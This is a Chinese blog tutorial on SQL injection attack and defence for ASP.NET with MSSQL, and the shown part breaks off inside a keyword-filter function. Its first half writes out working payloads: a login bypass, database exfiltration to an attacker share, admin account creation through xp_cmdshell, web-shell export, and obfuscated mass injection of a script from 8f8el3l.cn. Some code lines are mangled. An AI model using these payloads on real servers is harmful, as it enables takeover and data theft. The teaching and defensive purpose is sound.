@@ -1,0 +1,2915 @@
+I"?S<p>（对于sql注入的攻防，我只用过简单拼接字符串的注入及参数化查询，可以说没什么好经验，为避免后知后觉的犯下大错，专门查看大量前辈们的心得，这方面的资料颇多，将其精简出自己觉得重要的，就成了该文）</p>
+
+<p>下面的程序方案是采用 ASP.NET + MSSQL，其他技术在设置上会有少许不同。</p>
+
+<p>    <a href="http://files.cnblogs.com/heyuquan/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E9%98%B2%E5%85%A5%E9%97%A8%E8%AF%A6%E8%A7%A3_%E7%A4%BA%E4%BE%8B.rar">示例程序下载：SQL注入攻防入门详解_示例</a></p>
+
+<p>什么是SQL注入（SQL Injection）</p>
+
+<p>所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。在某些表单中，用户输入的内容直接用来构造（或者影响）动态SQL命令，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击。</p>
+
+<p>尝尝SQL注入</p>
+
+<h2 id="1-一个简单的登录页面">1. 一个简单的登录页面</h2>
+
+<p>关键代码：（详细见下载的示例代码）</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">noProtectLogin</span><span class="o">(</span><span class="n">string</span> <span class="n">userName</span><span class="o">,</span> <span class="n">string</span> <span class="n">password</span><span class="o">){</span>
+    <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="o">(</span><span class="kt">int</span><span class="o">)</span><span class="nc">SqlHelper</span><span class="o">.</span><span class="na">Instance</span><span class="o">.</span><span class="na">ExecuteScalar</span><span class="o">(</span><span class="n">string</span><span class="o">.</span><span class="na">Format</span>
+    <span class="o">(</span><span class="s">"SELECT COUNT(*) FROM Login WHERE UserName='{0}' AND Password='{1}'"</span><span class="o">,</span> <span class="n">userName</span><span class="o">,</span> <span class="n">password</span><span class="o">));</span>
+    <span class="k">return</span> <span class="n">count</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="kc">true</span> <span class="o">:</span> <span class="kc">false</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>方法中userName和 password 是没有经过任何处理，直接拿前端传入的数据，这样拼接的SQL会存在注入漏洞。（帐户：admin 123456）</p>
+
+<p>1) 输入正常数据，效果如图：</p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311921598057.png"><img src="../../images/2016/201210311922046482.png" alt="image" title="image" /></a></p>
+
+<p>合并的SQL为：</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">Login</span> <span class="k">WHERE</span> <span class="n">UserName</span><span class="o">=</span><span class="s1">'admin'</span> <span class="k">AND</span> <span class="n">Password</span><span class="o">=</span><span class="s1">'123456'</span>
+</code></pre></div></div>
+
+<p>2) 输入注入数据：</p>
+
+<p>如图，即用户名为：用户名：admin’—，密码可随便输入</p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/heyuquan/201210/20121031192207853.png"><img src="https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922089084.png" alt="image" title="image" /></a></p>
+
+<p>合并的SQL为：</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">SELECT</span> <span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">Login</span> <span class="k">WHERE</span> <span class="n">UserName</span><span class="o">=</span><span class="s1">'admin'</span><span class="c1">-- Password='123'</span>
+</code></pre></div></div>
+
+<p>因为UserName值中输入了“–”注释符，后面语句被省略而登录成功。（常常的手法：前面加上’; ‘ (分号，用于结束前一条语句)，后边加上’–’ (用于注释后边的语句)）</p>
+
+<ol>
+  <li>上面是最简单的一种SQL注入，常见的注入语句还有：</li>
+</ol>
+
+<p>1) 猜测数据库名，备份数据库</p>
+
+<p>a) 猜测数据库名： and db_name() &gt;0 或系统表master.dbo.sysdatabases</p>
+
+<p>b) 备份数据库：;backup database 数据库名 to disk = ‘c:\*.db’;–</p>
+
+<p>或：declare @a sysname;set @a=db_name();backup database @a to disk=’你的IP你的共享目录bak.dat’ ,name=’test’;–</p>
+
+<p>2) 猜解字段名称</p>
+
+<p>a) 猜解法：and (select count(字段名) from 表名)&gt;0 若“字段名”存在，则返回正常</p>
+
+<p>b) 读取法：and (select top 1 col_name(object_id(‘表名’),1) from sysobjects)&gt;0 把col_name(object_id(‘表名’),1)中的1依次换成2,3,4,5，6…就可得到所有的字段名称。</p>
+
+<p>3) 遍历系统的目录结构，分析结构并发现WEB虚拟目录（服务器上传木马）</p>
+
+<p>先创建一个临时表：;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));–</p>
+
+<p>a) 利用xp_availablemedia来获得当前所有驱动器,并存入temp表中</p>
+
+<p>;insert temp exec master.dbo.xp_availablemedia;–</p>
+
+<p>b) 利用xp_subdirs获得子目录列表,并存入temp表中</p>
+
+<p>;insert into temp(id) exec master.dbo.xp_subdirs ‘c:\’;–</p>
+
+<p>c) 利用xp_dirtree可以获得“所有”子目录的目录树结构,并存入temp表中</p>
+
+<p>;insert into temp(id,num1) exec master.dbo.xp_dirtree ‘c:\’;– （实验成功）</p>
+
+<p>d) 利用 bcp 命令将表内容导成文件</p>
+
+<p>即插入木马文本，然后导出存为文件。比如导出为asp文件，然后通过浏览器访问该文件并执行恶意脚本。（使用该命令必须启动’ xp_cmdshell’）</p>
+
+<p>Exec master..xp_cmdshell N’BCP “select * from SchoolMarket.dbo.GoodsStoreData;” queryout c:/inetpub/wwwroot/runcommand.asp -w -S”localhost” -U”sa” -P”123”’</p>
+
+<p>(注意：语句中使用的是双引号，另外表名格式为“数据库名.用户名.表名”)</p>
+
+<p>在sql查询器中通过语句：Exec master..xp_cmdshell N’BCP’即可查看BCP相关参数，如图：</p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/heyuquan/201211/201211080214126330.png"><img src="https://images.cnblogs.com/cnblogs_com/heyuquan/201211/201211080214125740.png" alt="image" title="image" /></a></p>
+
+<p>4) 查询当前用户的数据库权限</p>
+
+<p>MSSQL中一共存在8种权限：sysadmin, dbcreator, diskadmin, processadmin, serveradmin, setupadmin, securityadmin, bulkadmin。</p>
+
+<p>可通过1=(select IS_SRVROLEMEMBER(‘sysadmin’))得到当前用户是否具有该权限。</p>
+
+<p>5) 设置新的数据库帐户（得到MSSQL管理员账户）</p>
+
+<p>d) 在数据库内添加一个hax用户，默认密码是空</p>
+
+<p>;exec sp_addlogin’hax’;–</p>
+
+<p>e) 给hax设置密码 (null是旧密码，password是新密码，user是用户名)</p>
+
+<p>;exec master.dbo.sp_password null,password,username;–</p>
+
+<p>f) 将hax添加到sysadmin组</p>
+
+<p>;exec master.dbo.sp_addsrvrolemember ‘hax’ ,’sysadmin’;–</p>
+
+<p>6) xp_cmdshell MSSQL存储过程（得到 WINDOWS管理员账户 ）</p>
+
+<p>通过(5)获取到sysadmin权限的帐户后，使用查询分析器连接到数据库，可通过xp_cmdshell运行系统命令行（必须是sysadmin权限），即使用 cmd.exe 工具，可以做什么自己多了解下。</p>
+
+<p>下面我们使用xp_cmdshell来创建一个 Windows 用户，并开启远程登录服务：</p>
+
+<p>a) 判断xp_cmdshell扩展存储过程是否存在</p>
+
+<p>SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = ‘X’ AND name =’xp_cmdshell’</p>
+
+<p>b) 恢复xp_cmdshell扩展存储过程</p>
+
+<p>Exec master.dbo.sp_addextendedproc ‘xp_cmdshell’,’e:\inetput\web\xplog70.dll’;</p>
+
+<p>开启后使用xp_cmdshell还会报下面错误：</p>
+
+<p>SQL Server 阻止了对组件 ‘xp_cmdshell’ 的过程 ‘sys.xp_cmdshell’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用 ‘xp_cmdshell’。有关启用 ‘xp_cmdshell’ 的详细信息，请参阅 SQL Server 联机丛书中的 “外围应用配置器”。</p>
+
+<p>通过执行下面语句进行设置：</p>
+
+<p>-- 允许配置高级选项</p>
+
+<p>EXEC sp_configure ‘show advanced options’, 1</p>
+
+<p>GO</p>
+
+<p>-- 重新配置</p>
+
+<p>RECONFIGURE</p>
+
+<p>GO</p>
+
+<p>-- 启用xp_cmdshell</p>
+
+<p>EXEC sp_configure ‘xp_cmdshell’, 0</p>
+
+<p>GO</p>
+
+<p>–重新配置</p>
+
+<p>RECONFIGURE</p>
+
+<p>GO</p>
+
+<p>c) 禁用xp_cmdshell扩展存储过程</p>
+
+<p>Exec master.dbo.sp_dropextendedproc ‘xp_cmdshell’;</p>
+
+<p>d) 添加windows用户：</p>
+
+<p>Exec xp_cmdshell ‘net user awen /add’;</p>
+
+<p>e) 设置好密码：</p>
+
+<p>Exec xp_cmdshell ‘net user awen password’;</p>
+
+<p>f) 提升到管理员：</p>
+
+<p>Exec xp_cmdshell ‘net localgroup administrators awen /add’;</p>
+
+<p>g) 开启telnet服务：</p>
+
+<p>Exec xp_cmdshell ‘net start tlntsvr’</p>
+
+<p>7) 没有xp_cmdshell扩展程序，也可创建Windows帐户的办法.</p>
+
+<p>(本人windows7系统，测试下面SQL语句木有效果)</p>
+
+<p>declare @shell int ;</p>
+
+<p>execsp_OAcreate ‘w script .shell’,@shell output ;</p>
+
+<p>execsp_OAmethod @shell,’run’,null,’C:\Windows\System32\cmd.exe /c net user awen /add’;</p>
+
+<p>execsp_OAmethod @shell,’run’,null,’C:\Windows\System32\cmd.exe /c net user awen 123’;</p>
+
+<p>execsp_OAmethod @shell,’run’,null,’C:\Windows\System32\cmd.exe /c net localgroup administrators awen /add’;</p>
+
+<p>在使用的时候会报如下错：</p>
+
+<p>SQL Server 阻止了对组件 ‘Ole Automation Procedures’ 的过程 ‘sys.sp_OACreate’、’sys.sp_OAMethod’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用 ‘Ole Automation Procedures’。有关启用 ‘Ole Automation Procedures’ 的详细信息，请参阅 SQL Server 联机丛书中的 “外围应用配置器”。</p>
+
+<p>解决办法：</p>
+
+<p>sp_configure ‘show advanced options’, 1;</p>
+
+<p>GO</p>
+
+<p>RECONFIGURE;</p>
+
+<p>GO</p>
+
+<p>sp_configure ‘Ole Automation Procedures’, 1;</p>
+
+<p>GO</p>
+
+<p>RECONFIGURE;</p>
+
+<p>GO</p>
+
+<p>好了，这样别人可以登录你的服务器了，你怎么看？</p>
+
+<p>8) 客户端脚本攻击</p>
+
+<p>攻击1：（正常输入）攻击者通过正常的输入提交方式将恶意脚本提交到数据库中，当其他用户浏览此内容时就会受到恶意脚本的攻击。</p>
+
+<p>措施：转义提交的内容，.NET 中可通过System.Net.WebUtility.HtmlEncode(string) 方法将字符串转换为HTML编码的字符串。</p>
+
+<p>攻击2：（SQL注入）攻击者通过SQL注入方式将恶意脚本提交到数据库中，直接使用SQL语法UPDATE数据库，为了跳过System.Net.WebUtility.HtmlEncode(string) 转义，攻击者会将注入SQL经过“HEX编码”，然后通过exec可以执行“动态”SQL的特性运行脚本”。</p>
+
+<p>参考：</p>
+
+<p>注入：<a href="http://www.cnblogs.com/ryu666/archive/2009/07/28/1533248.html">SQL注入案例曝光，请大家提高警惕</a></p>
+
+<p>恢复：<a href="http://blog.sina.com.cn/s/blog_5e5d98b50100dlz9.html">批量清除数据库中被植入的js</a></p>
+
+<p>示例代码：（可在示例附带的数据库测试）</p>
+
+<p>a) 向当前数据库的每个表的每个字段插入一段恶意脚本</p>
+
+<p><a href="#" title="?">?</a>
+<code class="highlighter-rouge">Declare</code> <code class="highlighter-rouge">@T</code> <code class="highlighter-rouge">Varchar</code><code class="highlighter-rouge">(255),@C</code> <code class="highlighter-rouge">Varchar</code><code class="highlighter-rouge">(255)</code>
+<code class="highlighter-rouge">Declare</code> <code class="highlighter-rouge">Table_Cursor</code> <code class="highlighter-rouge">Cursor</code> <code class="highlighter-rouge">For</code>
+<code class="highlighter-rouge">Select</code> <code class="highlighter-rouge">A.</code><code class="highlighter-rouge">Name</code><code class="highlighter-rouge">,B.</code><code class="highlighter-rouge">Name</code>
+<code class="highlighter-rouge">From</code> <code class="highlighter-rouge">SysobjectsA,Syscolumns B</code> <code class="highlighter-rouge">Where</code> <code class="highlighter-rouge">A.Id=B.Id</code> <code class="highlighter-rouge">And</code> <code class="highlighter-rouge">A.Xtype=</code><code class="highlighter-rouge">'u'</code> <code class="highlighter-rouge">And</code> <code class="highlighter-rouge">(B.Xtype=99</code> <code class="highlighter-rouge">Or</code> <code class="highlighter-rouge">B.Xtype=35</code> <code class="highlighter-rouge">Or</code> <code class="highlighter-rouge">B.Xtype=231</code> <code class="highlighter-rouge">Or</code> <code class="highlighter-rouge">B.Xtype=167)</code>
+<code class="highlighter-rouge">Open</code> <code class="highlighter-rouge">Table_Cursor</code>
+<code class="highlighter-rouge">Fetch</code> <code class="highlighter-rouge">Next</code> <code class="highlighter-rouge">From</code>  <code class="highlighter-rouge">Table_Cursor</code> <code class="highlighter-rouge">Into</code> <code class="highlighter-rouge">@T,@C</code>
+<code class="highlighter-rouge">While(@@Fetch_Status=0)</code>
+<code class="highlighter-rouge">Begin</code>
+<code class="highlighter-rouge">Exec</code><code class="highlighter-rouge">(</code><code class="highlighter-rouge">'update ['</code><code class="highlighter-rouge">+@T+</code><code class="highlighter-rouge">'] Set ['</code><code class="highlighter-rouge">+@C+</code><code class="highlighter-rouge">']=Rtrim(Convert(Varchar(8000),['</code><code class="highlighter-rouge">+@C+</code><code class="highlighter-rouge">']))+'</code><code class="highlighter-rouge">'&lt;script src=[http://8f8el3l.cn/0.js&gt;&lt;/script](http://8f8el3l.cn/0.js&gt;&lt;/script)&gt;'</code><code class="highlighter-rouge">''</code><code class="highlighter-rouge">)</code>
+<code class="highlighter-rouge">Fetch</code> <code class="highlighter-rouge">Next</code> <code class="highlighter-rouge">From</code> <code class="highlighter-rouge">Table_Cursor</code> <code class="highlighter-rouge">Into</code> <code class="highlighter-rouge">@T,@C</code>
+<code class="highlighter-rouge">End</code>
+<code class="highlighter-rouge">Close</code> <code class="highlighter-rouge">Table_Cursor</code>
+<code class="highlighter-rouge">DeallocateTable_Cursor</code></p>
+
+<p>b) 更高级的攻击，将上面的注入SQL进行“HEX编码”，从而避免程序的关键字检查、脚本转义等，通过EXEC执行</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p><code class="highlighter-rouge">dEcLaRe</code> <code class="highlighter-rouge">@s</code> <code class="highlighter-rouge">vArChAr</code><code class="highlighter-rouge">(8000)</code> <code class="highlighter-rouge">sEt</code> <code class="highlighter-rouge">@s=0x4465636c617265204054205661726368617228323535292c4043205661726368617228323535290d0a4465636c617265205461626c655f437572736f7220437572736f7220466f722053656c65637420412e4e616d652c422e4e616d652046726f6d205379736f626a6563747320412c537973636f6c756d6e73204220576865726520412e49643d422e496420416e6420412e58747970653d27752720416e642028422e58747970653d3939204f7220422e58747970653d3335204f7220422e58747970653d323331204f7220422e58747970653d31363729204f70656e205461626c655f437572736f72204665746368204e6578742046726f6d20205461626c655f437572736f7220496e746f2040542c4043205768696c6528404046657463685f5374617475733d302920426567696e20457865632827757064617465205b272b40542b275d20536574205b272b40432b275d3d527472696d28436f6e7665727428566172636861722838303030292c5b272b40432b275d29292b27273c736372697074207372633d687474703a2f2f386638656c336c2e636e2f302e6a733e3c2f7363726970743e272727294665746368204e6578742046726f6d20205461626c655f437572736f7220496e746f2040542c404320456e6420436c6f7365205461626c655f437572736f72204465616c6c6f63617465205461626c655f437572736f72;</code>
+<code class="highlighter-rouge">eXeC</code><code class="highlighter-rouge">(@s);</code><code class="highlighter-rouge">--</code></p>
+
+<p>c) 批次删除数据库被注入的脚本</p>
+
+<p><a href="#" title="?">?</a>2</p>
+
+<p><code class="highlighter-rouge">declare</code> <code class="highlighter-rouge">@delStrnvarchar(500)</code></p>
+
+<p><code class="highlighter-rouge">set</code> <code class="highlighter-rouge">@delStr=</code><code class="highlighter-rouge">'&lt;script src=[http://8f8el3l.cn/0.js&gt;&lt;/script](http://8f8el3l.cn/0.js&gt;&lt;/script)&gt;'</code> <code class="highlighter-rouge">--要被替换掉字符</code></p>
+
+<p><code class="highlighter-rouge">setnocount</code> <code class="highlighter-rouge">on</code></p>
+
+<p><code class="highlighter-rouge">declare</code> <code class="highlighter-rouge">@tableNamenvarchar(100),@columnNamenvarchar(100),@tbIDint,@iRowint,@iResultint</code></p>
+
+<p><code class="highlighter-rouge">declare</code> <code class="highlighter-rouge">@sqlnvarchar(500)</code></p>
+
+<p><code class="highlighter-rouge">set</code> <code class="highlighter-rouge">@iResult=0</code></p>
+
+<p><code class="highlighter-rouge">declare</code> <code class="highlighter-rouge">cur</code> <code class="highlighter-rouge">cursor</code> <code class="highlighter-rouge">for</code></p>
+
+<p><code class="highlighter-rouge">selectname,id</code> <code class="highlighter-rouge">from</code> <code class="highlighter-rouge">sysobjects</code> <code class="highlighter-rouge">where</code> <code class="highlighter-rouge">xtype=</code><code class="highlighter-rouge">'U'</code></p>
+
+<p><code class="highlighter-rouge">open</code> <code class="highlighter-rouge">cur</code></p>
+
+<p><code class="highlighter-rouge">fetch</code> <code class="highlighter-rouge">next</code> <code class="highlighter-rouge">from</code> <code class="highlighter-rouge">cur</code> <code class="highlighter-rouge">into</code> <code class="highlighter-rouge">@tableName,@tbID</code></p>
+
+<p><code class="highlighter-rouge">while @@fetch_status=0</code></p>
+
+<p><code class="highlighter-rouge">begin</code></p>
+
+<p><code class="highlighter-rouge">declare</code> <code class="highlighter-rouge">cur1</code> <code class="highlighter-rouge">cursor</code> <code class="highlighter-rouge">for</code></p>
+
+<p><code class="highlighter-rouge">--xtype in (231,167,239,175) 为char,varchar,nchar,nvarchar类型</code></p>
+
+<p><code class="highlighter-rouge">select</code> <code class="highlighter-rouge">name</code> <code class="highlighter-rouge">from</code> <code class="highlighter-rouge">syscolumns</code> <code class="highlighter-rouge">where</code> <code class="highlighter-rouge">xtype</code> <code class="highlighter-rouge">in</code> <code class="highlighter-rouge">(231,167,239,175)</code> <code class="highlighter-rouge">and</code> <code class="highlighter-rouge">id=@tbID</code></p>
+
+<p><code class="highlighter-rouge">open</code> <code class="highlighter-rouge">cur1</code></p>
+
+<p><code class="highlighter-rouge">fetch</code> <code class="highlighter-rouge">next</code> <code class="highlighter-rouge">from</code> <code class="highlighter-rouge">cur1</code> <code class="highlighter-rouge">into</code> <code class="highlighter-rouge">@columnName</code></p>
+
+<p><code class="highlighter-rouge">while @@fetch_status=0</code></p>
+
+<p><code class="highlighter-rouge">begin</code></p>
+
+<p><code class="highlighter-rouge">set</code> <code class="highlighter-rouge">@sql=</code><code class="highlighter-rouge">'update ['</code> <code class="highlighter-rouge">+ @tableName +</code> <code class="highlighter-rouge">'] set ['</code><code class="highlighter-rouge">+ @columnName +</code><code class="highlighter-rouge">']= replace(['</code><code class="highlighter-rouge">+@columnName+</code><code class="highlighter-rouge">'],'</code><code class="highlighter-rouge">''</code><code class="highlighter-rouge">+@delStr+</code><code class="highlighter-rouge">''</code><code class="highlighter-rouge">','</code><code class="highlighter-rouge">''</code><code class="highlighter-rouge">') where ['</code><code class="highlighter-rouge">+@columnName+</code><code class="highlighter-rouge">'] like '</code><code class="highlighter-rouge">'%'</code><code class="highlighter-rouge">+@delStr+</code><code class="highlighter-rouge">'%'</code><code class="highlighter-rouge">''</code>    </p>
+
+<p><code class="highlighter-rouge">execsp_executesql @sql</code></p>
+
+<p><code class="highlighter-rouge">set</code> <code class="highlighter-rouge">@iRow=@@rowcount</code></p>
+
+<p><code class="highlighter-rouge">set</code> <code class="highlighter-rouge">@iResult=@iResult+@iRow</code></p>
+
+<p><code class="highlighter-rouge">if @iRow&gt;0</code></p>
+
+<p><code class="highlighter-rouge">begin</code></p>
+
+<p><code class="highlighter-rouge">print</code> <code class="highlighter-rouge">'表：'</code><code class="highlighter-rouge">+@tableName+</code><code class="highlighter-rouge">',列:'</code><code class="highlighter-rouge">+@columnName+</code><code class="highlighter-rouge">'被更新'</code><code class="highlighter-rouge">+</code><code class="highlighter-rouge">convert</code><code class="highlighter-rouge">(</code><code class="highlighter-rouge">varchar</code><code class="highlighter-rouge">(10),@iRow)+</code><code class="highlighter-rouge">'条记录;'</code></p>
+
+<p><code class="highlighter-rouge">end</code></p>
+
+<p><code class="highlighter-rouge">fetch</code> <code class="highlighter-rouge">next</code> <code class="highlighter-rouge">from</code> <code class="highlighter-rouge">cur1</code> <code class="highlighter-rouge">into</code> <code class="highlighter-rouge">@columnName</code></p>
+
+<p><code class="highlighter-rouge">end</code></p>
+
+<p><code class="highlighter-rouge">close</code> <code class="highlighter-rouge">cur1</code></p>
+
+<p><code class="highlighter-rouge">deallocate</code> <code class="highlighter-rouge">cur1</code></p>
+
+<p><code class="highlighter-rouge">fetch</code> <code class="highlighter-rouge">next</code> <code class="highlighter-rouge">from</code> <code class="highlighter-rouge">cur</code> <code class="highlighter-rouge">into</code> <code class="highlighter-rouge">@tableName,@tbID</code></p>
+
+<p><code class="highlighter-rouge">end</code></p>
+
+<p><code class="highlighter-rouge">print</code> <code class="highlighter-rouge">'数据库共有'</code><code class="highlighter-rouge">+</code><code class="highlighter-rouge">convert</code><code class="highlighter-rouge">(</code><code class="highlighter-rouge">varchar</code><code class="highlighter-rouge">(10),@iResult)+</code><code class="highlighter-rouge">'条记录被更新!!!'</code></p>
+
+<p><code class="highlighter-rouge">close</code> <code class="highlighter-rouge">cur</code></p>
+
+<p><code class="highlighter-rouge">deallocate</code> <code class="highlighter-rouge">cur</code></p>
+
+<p><code class="highlighter-rouge">setnocount</code> <code class="highlighter-rouge">off</code></p>
+
+<p>d) 我如何得到“HEX编码”？</p>
+
+<p>开始不知道HEX是什么东西，后面查了是“十六进制”，网上已经给出两种转换方式：（注意转换的时候不要加入十六进制的标示符 ’0x’ ）</p>
+
+<p>Ø <a href="http://home.paulschou.net/tools/xlate/">在线转换 （TRANSLATOR, BINARY），进入……</a></p>
+
+<p>Ø <a href="http://hi.baidu.com/bopdawpdarbenxq/item/4be36d83d7937356e63d19c5">C#版的转换，进入……</a></p>
+
+<p>9) 对于敏感词过滤不到位的检查，我们可以结合函数构造SQL注入</p>
+
+<p>比如过滤了update，却没有过滤declare、exec等关键词，我们可以使用reverse来将倒序的sql进行注入：</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p><code class="highlighter-rouge">declare</code> <code class="highlighter-rouge">@A</code> <code class="highlighter-rouge">varchar</code><code class="highlighter-rouge">(200);</code><code class="highlighter-rouge">set</code> <code class="highlighter-rouge">@A=reverse(</code><code class="highlighter-rouge">''</code><code class="highlighter-rouge">'58803303431'</code><code class="highlighter-rouge">'=emanresu erehw '</code><code class="highlighter-rouge">'9d4d9c1ac9814f08'</code><code class="highlighter-rouge">'=drowssaP tes xxx tadpu'</code><code class="highlighter-rouge">);</code></p>
+
+<h2 id="防止sql注入">防止SQL注入</h2>
+
+<h2 id="1-数据库权限控制只给访问数据库的web应用功能所需的最低权限帐户">1. 数据库权限控制，只给访问数据库的web应用功能所需的最低权限帐户。</h2>
+
+<p>如MSSQL中一共存在8种权限：sysadmin, dbcreator, diskadmin, processadmin, serveradmin, setupadmin, securityadmin, bulkadmin。</p>
+
+<p>##2. 自定义错误信息，首先我们要屏蔽服务器的详细错误信息传到客户端。</p>
+
+<p>在 ASP.NET 中，可通过web.config配置文件的<customErrors>节点设置：</customErrors></p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p><code class="highlighter-rouge">&lt;</code><code class="highlighter-rouge">customErrors</code> <code class="highlighter-rouge">defaultRedirect="url" mode="On|Off|RemoteOnly"&gt;</code></p>
+
+<p><code class="highlighter-rouge">&lt;</code><code class="highlighter-rouge">error.</code> <code class="highlighter-rouge">. ./&gt;</code></p>
+
+<p><code class="highlighter-rouge">&lt;/</code><code class="highlighter-rouge">customErrors</code><code class="highlighter-rouge">&gt;</code></p>
+
+<p><a href="http://msdn.microsoft.com/zh-cn/library/h0hfz6fc(v=vs.80).aspx">更详细，请进入……</a></p>
+
+<p>mode：指定是启用或禁用自定义错误，还是仅向远程客户端显示自定义错误。</p>
+
+<p>On</p>
+
+<p>指定启用自定义错误。如果未指定defaultRedirect，用户将看到一般性错误。</p>
+
+<p>Off</p>
+
+<p>指定禁用自定义错误。这允许显示标准的详细错误。</p>
+
+<p>RemoteOnly</p>
+
+<p>指定仅向远程客户端显示自定义错误并且向本地主机显示 ASP.NET 错误。这是默认值。</p>
+
+<p>看下效果图：</p>
+
+<p>设置为<customErrors mode="On">一般性错误：</customErrors></p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922122276.png"><img src="https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922155916.png" alt="image" title="image" /></a></p>
+
+<p>设置为<customErrors mode="Off">：</customErrors></p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922188617.png"><img src="https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922238089.png" alt="image" title="image" /></a></p>
+
+<h2 id="3-把危险的和不必要的存储过程删除">3. 把危险的和不必要的存储过程删除</h2>
+
+<p>xp_：扩展存储过程的前缀，SQL注入攻击得手之后，攻击者往往会通过执行xp_cmdshell之类的扩展存储过程，获取系统信息，甚至控制、破坏系统。</p>
+
+<p>xp_cmdshell</p>
+
+<p>能执行dos命令，通过语句sp_dropextendedproc删除，</p>
+
+<p>不过依然可以通过sp_addextendedproc来恢复，因此最好删除或改名xplog70.dll（sql server 2000、windows7）</p>
+
+<p>xpsql70.dll(sqlserer 7.0)</p>
+
+<p>xp_fileexist</p>
+
+<p>用来确定一个文件是否存在</p>
+
+<p>xp_getfiledetails</p>
+
+<p>可以获得文件详细资料</p>
+
+<p>xp_dirtree</p>
+
+<p>可以展开你需要了解的目录，获得所有目录深度</p>
+
+<p>Xp_getnetname</p>
+
+<p>可以获得服务器名称</p>
+
+<p>Xp_regaddmultistring</p>
+
+<p>Xp_regdeletekey</p>
+
+<p>Xp_regdeletevalue</p>
+
+<p>Xp_regenumvalues</p>
+
+<p>Xp_regread</p>
+
+<p>Xp_regremovemultistring</p>
+
+<p>Xp_regwrite</p>
+
+<p>可以访问注册表的存储过程</p>
+
+<p>Sp_OACreate</p>
+
+<p>Sp_OADestroy</p>
+
+<p>Sp_OAGetErrorInfo</p>
+
+<p>Sp_OAGetProperty</p>
+
+<p>Sp_OAMethod</p>
+
+<p>Sp_OASetProperty</p>
+
+<p>Sp_OAStop</p>
+
+<p>如果你不需要请丢弃OLE自动存储过程</p>
+
+<ol>
+  <li>非参数化SQL与参数化SQL</li>
+</ol>
+
+<p>1) 非参数化（动态拼接SQL）</p>
+
+<p>a) 检查客户端脚本：若使用.net，直接用System.Net.WebUtility.HtmlEncode(string)将输入值中包含的<a href="http://www.cnblogs.com/rpoplar/archive/2012/08/03/2621409.html">《HTML特殊转义字符》</a>转换掉。</p>
+
+<p>b) 类型检查：对接收数据有明确要求的，在方法内进行类型验证。如数值型用int.TryParse()，日期型用DateTime.TryParse() ，只能用英文或数字等。</p>
+
+<p>c) 长度验证：要进行必要的注入，其语句也是有长度的。所以如果你原本只允许输入10字符，那么严格控制10个字符长度，一些注入语句就没办法进行。</p>
+
+<p>d) 使用枚举：如果只有有限的几个值，就用枚举。</p>
+
+<p>e) 关键字过滤：这个门槛比较高，因为各个数据库存在关键字，内置函数的差异，所以对编写此函数的功底要求较高。如公司或个人有积累一个比较好的通用过滤函数还请留言分享下，学习学习，谢谢！</p>
+
+<p>这边提供一个关键字过滤参考方案(MSSQL)：</p>
+
+<p><a href="#" title="?">?</a></p>
+
+<p>1</p>
+
+<p>2</p>
+
+<p>3</p>
+
+<p>4</p>
+
+<p>5</p>
+
+<p>6</p>
+
+<p>7</p>
+
+<p>8</p>
+
+<p>9</p>
+
+<p>10</p>
+
+<p>11</p>
+
+<p>12</p>
+
+<p>13</p>
+
+<p>14</p>
+
+<p>15</p>
+
+<p>16</p>
+
+<p>17</p>
+
+<p>18</p>
+
+<p>19</p>
+
+<p><code class="highlighter-rouge">public</code> <code class="highlighter-rouge">static</code> <code class="highlighter-rouge">bool</code> <code class="highlighter-rouge">ValiParms(</code><code class="highlighter-rouge">string</code> <code class="highlighter-rouge">parms)</code></p>
+
+<p><code class="highlighter-rouge">{</code></p>
+
+<p><code class="highlighter-rouge">if</code> <code class="highlighter-rouge">(parms ==</code> <code class="highlighter-rouge">null</code><code class="highlighter-rouge">)</code></p>
+
+<p><code class="highlighter-rouge">{</code></p>
+
+<p><code class="highlighter-rouge">return</code> <code class="highlighter-rouge">false</code><code class="highlighter-rouge">;</code></p>
+
+<p><code class="highlighter-rouge">}</code></p>
+
+<p><code class="highlighter-rouge">Regex regex =</code> <code class="highlighter-rouge">new</code> <code class="highlighter-rouge">Regex(</code><code class="highlighter-rouge">"sp_"</code><code class="highlighter-rouge">, RegexOptions.IgnoreCase);</code></p>
+
+<p><code class="highlighter-rouge">Regex regex2 =</code> <code class="highlighter-rouge">new</code> <code class="highlighter-rouge">Regex(</code><code class="highlighter-rouge">"'"</code><code class="highlighter-rouge">, RegexOptions.IgnoreCase);</code></p>
+
+<p><code class="highlighter-rouge">Regex regex3 =</code> <code class="highlighter-rouge">new</code> <code class="highlighter-rouge">Regex(</code><code class="highlighter-rouge">"create "</code><code class="highlighter-rouge">, RegexOptions.IgnoreCase);</code></p>
+
